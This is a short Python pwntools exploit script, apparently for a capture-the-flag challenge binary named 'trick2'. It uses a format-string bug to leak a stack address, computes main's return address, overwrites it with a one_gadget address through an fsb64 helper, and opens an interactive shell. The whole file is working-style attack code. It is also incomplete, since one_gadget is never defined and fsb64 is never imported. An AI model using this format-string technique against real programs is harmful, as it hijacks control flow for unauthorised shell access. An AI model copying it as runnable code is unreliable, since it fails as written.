#!/usr/bin/python 
from pwn import *
#from koharin import *

p = process("./trick2")
elf = ELF("./trick2")
libc = elf.libc

#one_gadget_offset = get_oneshot('l')

pay = ''
pay += '%' + str(6 + 0x118/8) + '$p'

p.send(pay)

leak = int(p.recv(14), 16)
main_ret = leak - 0xd8

pay = fsb64(6, main_ret, one_gadget)

p.send(pay)


p.interactive()


